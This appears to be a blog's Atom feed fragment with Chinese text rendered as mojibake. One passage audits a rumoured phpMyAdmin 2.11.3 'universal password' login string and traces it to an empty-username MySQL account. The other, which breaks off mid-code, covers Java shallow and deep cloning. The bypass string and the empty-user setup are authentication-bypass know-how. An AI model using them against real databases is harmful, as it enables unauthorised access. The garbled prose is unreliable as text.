class="headerlink" title="åˆæ¢ä¸‡èƒ½å¯†ç "></a>åˆæ¢ä¸‡èƒ½å¯†ç </h2><br><p>æŒ‰ç…§ç½‘ä¸Šè¯´çš„ï¼Œç›´æ¥ <code>&#39;localhost&#39;@&#39;@&quot;</code> ç³Šè„¸</p><img src="/2021/02/27/2021-02-27-phpmyadmin-universalPassword/1.png" style="width:500px"><br><p>ä¸å¤ªè¡Œå‘¢ï¼Œç¿»äº†å‡ ç¯‡å†…å®¹ä¸€æ ·ä½†æ˜¯å‡ºå¤„ä¸åŒæ–‡ç« åï¼Œå‘ç°äº†ä¸€ç¯‡æ–‡ç« :</p><p><a href="https://www.cnblogs.com/gqdw/archive/2012/10/11/2720519.html">https://www.cnblogs.com/gqdw/archive/2012/10/11/2720519.html</a></p><br><p>å°è¯•åœ¨ <em>mysql</em> ä¸­æ·»åŠ ä¸€ä¸ª <em>user</em> ä¸º â€˜â€™ <em>password</em> ä¸º â€˜â€™ çš„è´¦æˆ·</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;&#39;@&#39;localhost&#39; identified by &#39;&#39;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><br><p>å†æ¬¡ä½¿ç”¨ â€œä¸‡èƒ½å¯†ç â€ç™»é™†ï¼Œå‘ç°æˆåŠŸç™»é™†ã€‚</p><p>é€€å‡ºï¼Œç”¨æˆ·åå¤„ä¹±æ‰“ï¼Œ<strong>å¯†ç ä¸å†™</strong>ï¼Œä¾ç„¶èƒ½æˆåŠŸç™»é™†</p><br><p>çœ‹æ¥æ‰€è°“çš„ â€œä¸‡èƒ½å¯†ç â€ åªæ˜¯ mysqlçš„é…ç½®é—®é¢˜å˜›ï¼Ÿ</p><br><h2 id="æŸ¥çœ‹æºç "><a href="#æŸ¥çœ‹æºç " class="headerlink" title="æŸ¥çœ‹æºç "></a>æŸ¥çœ‹æºç </h2><p>ç¿»çœ‹ phpmyadmin æºç ï¼Œè·Ÿè¿›å‡ æ¬¡æµç¨‹åï¼Œæ‰¾åˆ° phpmyadmin è·å– ç™»é™†è¡¨å•æ•°æ®çš„åœ°æ–¹:</p><br><p><strong>libraries/common.inc.php</strong> line 751</p><p><code>$cfg[&#39;Server&#39;][&#39;auth_type&#39;]</code> ä¸º <em>config.inc.php</em> é…ç½®çš„å€¼</p><p><code>PMA_auth_check()</code>å‡½æ•°ä¸­ï¼Œåªè¦ å‘é€äº†ç™»é™†è¡¨å•çš„æ•°æ®ï¼Œå°±è¿”å› trueã€‚</p><p><code>PMA_auth_set_user();</code> æ˜¯æˆ‘ä»¬æµ‹è¯•æ—¶çš„é‡ç‚¹å‡½æ•°ä¹‹ä¸€ï¼Œå®ƒå°† ç™»é™†è¡¨å•å‘é€çš„è´¦å·å¯†ç ä¿å­˜è‡³ <code>$cfg[&#39;Server&#39;]</code> ä¸­</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/auth/&#x27;</span> . <span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;auth_type&#x27;</span>] . <span class="string">&#x27;.auth.lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!PMA_auth_check()) &#123;</span><br><span class="line">    PMA_auth();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    PMA_auth_set_user();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>ç„¶åç¨‹åºå°†èµ°åˆ°</p><p><strong>libraries/common.inc.php</strong> line 819</p><p>è°ƒç”¨å‡½æ•° <code>PMA_DBI_connect</code>ï¼Œä¼ å…¥ è´¦å·å¯†ç </p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="variable">$controllink</span>) &#123;</span><br><span class="line">    <span class="variable">$controllink</span> = PMA_DBI_connect(<span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;user&#x27;</span>],</span><br><span class="line">                                   <span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;password&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>åœ¨ <strong>libraries/dbi/mysql.dbi.lib.php</strong> çš„ <em>PMA_DBI_connect</em> å‡½æ•°ä¸­ï¼Œline 77</p><p>è°ƒç”¨å‡½æ•° <code>PMA_DBI_real_connect</code>ï¼Œä¼ å…¥é…ç½®ï¼Œ*$user* å’Œ <em>$password</em> éƒ½æ˜¯å‡½æ•°å½¢å‚</p><p><strong>æœ€ç»ˆè¿”å›</strong>çš„æ˜¯ <code>PMA_DBI_real_connect</code>å‡½æ•°çš„è¿”å›å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span> = PMA_DBI_real_connect(<span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;host&#x27;</span>] . <span class="variable">$server_port</span> . <span class="variable">$server_socket</span>, <span class="variable">$user</span>, <span class="variable">$password</span>, <span class="keyword">empty</span>(<span class="variable">$client_flags</span>) ? <span class="literal">NULL</span> : <span class="variable">$client_flags</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$link</span>;</span><br></pre></td></tr></table></figure><br><p><strong>libraries/dbi/mysql.dbi.lib.php</strong> çš„ <code>PMA_DBI_real_connect</code> å‡½æ•°ä¸­ï¼Œline 30</p><p><code>$link</code> å°è¯•è¿æ¥ mysql æ•°æ®åº“ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›èµ„æºï¼Œå¤±è´¥è¿”å› false</p><p>æœ€ç»ˆè¿”å›çš„å°±æ˜¯ <strong>æ˜¯å¦æˆåŠŸè¿æ¥ mysqlæ•°æ®åº“</strong>ï¼ŒæˆåŠŸè¿”å›è¿æ¥å¥æŸ„ï¼Œå¤±è´¥è¿”å› false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span> = @mysql_connect(<span class="variable">$server</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$link</span>;</span><br></pre></td></tr></table></figure><br><p>ä»¥ä¸Šå°±æ˜¯ <em>phpmyadmin</em> ç™»é™†çš„è¿‡ç¨‹äº†ã€‚åªè¦ <code>$link</code> è¿”å›è¿æ¥å¥æŸ„åˆ™ç™»é™†æˆåŠŸï¼Œåä¹‹ç™»é™†å¤±è´¥</p><br><p>è¿™ä¹ˆçœ‹ä¸‹æ¥ï¼Œæ„Ÿè§‰å’Œ <em>phpmyadmin</em> çš„ä»£ç æ²¡æœ‰åŠæ¯›å…³ç³»ï¼Œåªæ˜¯ <em>mysql</em> é…ç½®çš„é—®é¢˜ã€‚è€Œä¸”ä¹Ÿä¸æ˜¯éè¦ç”¨ <code>&#39;localhost&#39;@&#39;@&quot;</code> æ‰èƒ½ç™»é™†</p><br><p>è‡³äºä¸ºä»€ä¹ˆéšä¾¿è¾“å…¥ä¹Ÿèƒ½ç™»é™†å‘¢ï¼Ÿç®€å•æµ‹è¯•äº†ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&#x27;&#x27;</span>)); <span class="comment">//ç»“æœ resource</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&#x27;&#x27;</span>)); <span class="comment">//ç»“æœ resource</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&#x27;123&#x27;</span>)); <span class="comment">//ç»“æœ false</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&#x27;123&#x27;</span>)); <span class="comment">//ç»“æœ false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="çŒœæµ‹"><a href="#çŒœæµ‹" class="headerlink" title="çŒœæµ‹"></a>çŒœæµ‹</h2><br><p>åŸºäºä»¥ä¸Šç²—æµ…çš„åˆ†æï¼Œå¾—å‡ºä»¥ä¸‹å¯èƒ½æ€§:</p><p>ç¬¬ä¸€ç§å¯èƒ½ï¼šè¯¥æ¼æ´çš„æˆå› ä¸º mysql ä¸­é»˜è®¤ç•™æœ‰ä¸€ä¸ªç”¨æˆ·åä¸ºç©ºçš„ç”¨æˆ·ï¼Œæ‰€ä»¥å¯¼è‡´è¾“å…¥ä»»æ„ç”¨æˆ·åç©ºå¯†ç å¯ç™»é™†</p><p>ç¬¬äºŒç§å¯èƒ½ï¼šå¯èƒ½æœ‰è¿™ä¸ªæ¼æ´çš„phpmyadminæ˜¯æœ‰åé—¨çš„</p><br><p>ä»¥ä¸Šçš†æ˜¯ç²—æµ…åˆ†æ phpmyadmin 2.11.3 çš„ç»“è®ºã€‚å¦‚æœ‰ä¸æ­£ç¡®çš„åœ°æ–¹æ¬¢è¿æŒ‡å‡º</p>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;ç½‘ä¸Šå¹¿ä¸ºæµç¨‹çš„ phpmyadmin ä¸‡èƒ½å¯†ç å¦‚ä¸‹:&lt;/p&gt;
&lt;br&gt;

&lt;blockquote&gt;
&lt;p&gt;â€˜localhostâ€˜@â€˜@â€&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ®è¯´ phpmyadmin ç‰ˆæœ¬ä¸º 2.11.3 å’Œ 2.11.4 éƒ½å¯ç”¨&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;ä½†æ˜¯è¿™ä¸ªæ¼æ´æ²¡æœ‰ CVEç¼–å·ï¼Œå›½å¤–ä¹Ÿæ²¡æœåˆ°å…³äºè¿™ä¸ªæ¼æ´çš„è¯¦æƒ…&lt;/p&gt;</summary>
    
    
    
    <category term="codeAudit" scheme="http://example.com/categories/codeAudit/"/>
    
    <category term="phpmyadmin" scheme="http://example.com/categories/codeAudit/phpmyadmin/"/>
    
    
    <category term="codeAudit" scheme="http://example.com/tags/codeAudit/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Javaç¬”è®°(1) - å˜é‡å€¼å¼•ç”¨å’Œæ‹·è´</title>
    <link href="http://example.com/2021/02/27/2021-02-27-java-copy-object/"/>
    <id>http://example.com/2021/02/27/2021-02-27-java-copy-object/</id>
    <published>2021-02-27T00:42:51.000Z</published>
    <updated>2021-03-06T06:28:26.932Z</updated>
    
    <content type="html"><![CDATA[<br><p>java ä¸­ <em>Object</em> çš„æ“ä½œéƒ½æ˜¯å¼•ç”¨ã€‚<em>åŸå§‹æ•°æ®ç±»å‹</em>æ“ä½œéƒ½æ˜¯å€¼æ‹·è´ã€‚</p><p>è¿™é‡Œçš„æ“ä½œå°±åŒ…æ‹¬ <strong>èµ‹å€¼</strong> å’Œ å‡½æ•°<strong>å‚æ•°ä¼ é€’</strong></p><span id="more"></span><br><p>è¿™é‡Œè¯´æ˜ä¸‹ java ä¸­çš„æ¦‚å¿µ: </p><p><strong>javaä¸­æ‰€æœ‰çš„ç±»éƒ½éšå½¢ç»§æ‰¿äº† Obejct ç±»</strong></p><p><strong>javaä¸­æ•°ç»„ä¹Ÿæ˜¯ Object</strong>ï¼Œ<a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-4.html#jls-4.3.1">å®˜æ–¹</a>åŸè¯:</p><br><blockquote><p>An <em>object</em> is a <em>class instance</em> or an <em>array</em>.</p></blockquote><br><h1 id="èµ‹å€¼"><a href="#èµ‹å€¼" class="headerlink" title="èµ‹å€¼"></a>èµ‹å€¼</h1><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//ç±»èµ‹å€¼</span></span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = b;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ•°ç»„èµ‹å€¼</span></span><br><span class="line">        Integer[] i = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">        Integer[] ii = i;</span><br><span class="line">        ii[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Int èµ‹å€¼</span></span><br><span class="line">        Integer i2 = <span class="number">3</span>;</span><br><span class="line">        Integer ii2 = i2;</span><br><span class="line">        ii2 = <span class="number">101</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debugæ˜¾ç¤º:</strong></p><p>b = <span style="color:red">{B@785}</span><br> &nbsp;&nbsp;&nbsp;b_value = 1<br> &nbsp;&nbsp;&nbsp;b_c_class = <span style="color:blue">{C@790} </span><br>bb = <span style="color:red">{B@785} </span><br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:blue">{C@790} </span></p><p>i = <span style="color:red">{Integer[1]@786} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@788} <span style="color:blue">100</span><br>ii = <span style="color:red">{Integer[1]@786} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@788} <span style="color:blue">100</span></p><p>i2 = <span style="color:red">{Integer@787}</span><br>&nbsp;&nbsp;&nbsp; value = 3<br>ii2 = <span style="color:red">{Integer@789}</span><br>&nbsp;&nbsp;&nbsp; value = 101</p><br><p>å¯ä»¥å‘ç°ï¼Œåªæœ‰ Integer çš„èµ‹å€¼æ˜¯é‡æ–°å¼€è¾Ÿäº†ä¸€å—å†…å­˜æ¥å­˜æ”¾åŸæ•°æ®ã€‚</p><p>å…¶ä»–çš„ Object ç±»å‹æ“ä½œéƒ½æ˜¯ <em>å¼•ç”¨èµ‹å€¼</em>ã€‚å³ç›´æ¥å°†å†…å­˜åœ°å€çš„æŒ‡é’ˆæŒ‡å‘åŸåœ°å€ï¼Œå¤ç”¨åŸåœ°å€çš„æ•°æ®ï¼Œè€Œä¸æ˜¯é‡æ–°å¼€è¾Ÿå†…å­˜ã€‚è¿™æ ·å¯¼è‡´çš„ç»“æœå°±æ˜¯ï¼š</p><p>aå˜é‡ç›´æ¥èµ‹å€¼ç»™bå˜é‡ï¼Œä¿®æ”¹ bå˜é‡ï¼Œaå˜é‡ä¹Ÿä¼šå—åˆ°å½±å“ï¼Œå› ä¸ºä»–ä»¬çš„å†…å­˜åœ°å€æŒ‡é’ˆæŒ‡å‘çš„æ˜¯åŒä¸€å—å†…å­˜åœ°å€ã€‚</p><br><p>é‚£å¦‚ä½•è®© Object èµ‹å€¼çš„æ—¶å€™é‡æ–°å¼€è¾Ÿå†…å­˜å‘¢ï¼Ÿ<em>Object</em> ä¸­æä¾›äº†ä¸€ä¸ª <em>clone()</em> æ–¹æ³•</p><br><h2 id="æ•°ç»„å€¼æ‹·è´"><a href="#æ•°ç»„å€¼æ‹·è´" class="headerlink" title="æ•°ç»„å€¼æ‹·è´"></a>æ•°ç»„å€¼æ‹·è´</h2><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Integer[] i = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">Integer[] ii = i.clone();</span><br><span class="line">ii[<span class="number">0</span>] = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><br><p><strong>Debugæ˜¾ç¤º:</strong></p><p>i = <span style="color:red">{Integer[1]@782} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@785} <span style="color:blue">1</span><br>ii = <span style="color:red">{Integer[1]@783} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@784} <span style="color:blue">100</span></p><br><p>æ•°ç»„å€¼æ‹·è´ï¼Œä½¿ç”¨ clone() æ–¹æ³•å³å¯</p><br><h2 id="ç±»æ‹·è´"><a href="#ç±»æ‹·è´" class="headerlink" title="ç±»æ‹·è´"></a>ç±»æ‹·è´</h2><br><p>å¦‚æœè¦æ‹·è´çš„å¯¹è±¡æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»çš„è¯ï¼Œæ˜¯æ²¡æ³•ç›´æ¥ cloneçš„ã€‚éœ€è¦ å®ç° <em>Cloneable</em> æ¥å£ï¼Œé‡å†™ <em>clone()</em> æ–¹æ³•ï¼Œå¹¶ä¸” catch ä½ <em>CloneNotSupportedException</em></p><br><h3 id="æµ…æ‹·è´"><a href="#æµ…æ‹·è´" class="headerlink" title="æµ…æ‹·è´"></a>æµ…æ‹·è´</h3><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            bClone = (B) <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = (B)b.clone();</span><br><span class="line">        </span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debug æ˜¾ç¤º:</strong></p><p>b = <span style="color:red">{B@783} </span><br>&nbsp;&nbsp;&nbsp; b_value = 1<br> &nbsp;&nbsp;&nbsp;b_c_class = <span style="color:red">{C@785} </span><br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c_value = <span style="color:blue">300</span><br>bb = <span style="color:red">{B@784} </span><br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@785} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">300</span></p><br><p>å¯¹è±¡æµ…æ‹·è´å³ï¼šæ‹·è´æ—¶ç›®æ ‡å˜é‡ç¡®å®é‡æ–°æ‹·è´äº†åŸå¯¹è±¡çš„å€¼ï¼Œä½†æ˜¯åŸå¯¹è±¡ä¸­ä¿å­˜çš„<strong>å…¶ä»–å¯¹è±¡</strong>ä¾ç„¶åªæ˜¯å•çº¯åœ°æŠŠåœ°å€æ‹·è´åˆ°ç›®æ ‡å˜é‡ï¼Œå¹¶ä¸æ˜¯é‡æ–°æ‹·è´ä¸€ä»½ã€‚</p><p>å³ä¸Šé¢Demoä¸­ï¼Œ<em>b_c_class</em> ä¿å­˜çš„æ˜¯<em>å¯¹è±¡C</em> çš„å€¼ã€‚ <strong>bb</strong> ä¸­ä¿å­˜çš„ <em>b_c_class</em> <strong>æŒ‡å‘çš„åœ°å€</strong> å’Œ <strong>b</strong> ä¸­<em>b_c_class</em> <strong>æŒ‡å‘çš„åœ°å€</strong>æ˜¯åŒä¸€å—å†…å­˜ï¼Œæ‰€ä»¥ä¿®æ”¹ bbå¯¹è±¡ ä¸­çš„ b_c_classï¼Œbå¯¹è±¡ä¹Ÿä¼šå—åˆ°ç‰µè¿</p><br><h3 id="æ·±æ‹·è´"><a href="#æ·±æ‹·è´" class="headerlink" title="æ·±æ‹·è´"></a>æ·±æ‹·è´</h3><br><p>ä¸ºäº†è®© <strong>bbå¯¹è±¡</strong> ä¸­çš„ <em>b_c_class</em> é‡æ–°æ‹·è´ä¸€ä»½ <strong>Cå¯¹è±¡</strong>ã€‚éœ€è¦ä¿®æ”¹ä¸‹ <em>clone()</em> æ–¹æ³•ã€‚</p><p>å®ç° Cç±» çš„clone()æ–¹æ³•ï¼Œç„¶ååœ¨ Bç±» å¤„æ‰‹åŠ¨ clone <em>b_c_class</em></p><br><p><strong>Demo:</strong></p><p>line 27 å¤„å°† <em>Cå¯¹è±¡</em> é‡æ–°<em>clone</em>ä¸€ä»½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">        C cClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cClone = (C) <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">        B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//clone Object B</span></span><br><span class="line">            bClone = (B) <span class="keyword">super</span>.clone();</span><br><span class="line">            <span class="comment">//clone Object C</span></span><br><span class="line">            bClone.b_c_class = (C) bClone.b_c_class.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = (B)b.clone();</span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><p><strong>Debugæ˜¾ç¤º:</strong></p><p>b = {B@784}<br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@787} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">100</span><br>bb = {B@785}<br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@786} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">300</span></p><br><p>ç°åœ¨ç¡®å®å¯ä»¥å°† å¯¹è±¡ä¸­çš„å¯¹è±¡ è¿›è¡Œæ‹·è´äº†ã€‚ä½†æ˜¯å¦‚æœå¯¹è±¡çš„å±‚æ•°å¾ˆå¤šçš„è¯ï¼Œå°±æ˜¾å¾—å¾ˆéº»çƒ¦äº†ã€‚</p><p>è¿˜å¯ä»¥é€šè¿‡åºåˆ—åŒ–çš„æ–¹å¼æ¥è¿›è¡Œå¯¹è±¡æ‹·è´ï¼Œè¿™ç§æ–¹å¼æ›´æ–¹ä¾¿ã€‚</p><br><p>åºåˆ—åŒ–çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼šè¢«åºåˆ—åŒ–çš„ç±»éœ€è¦å®ç° <em>Serializable</em> æ¥å£</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 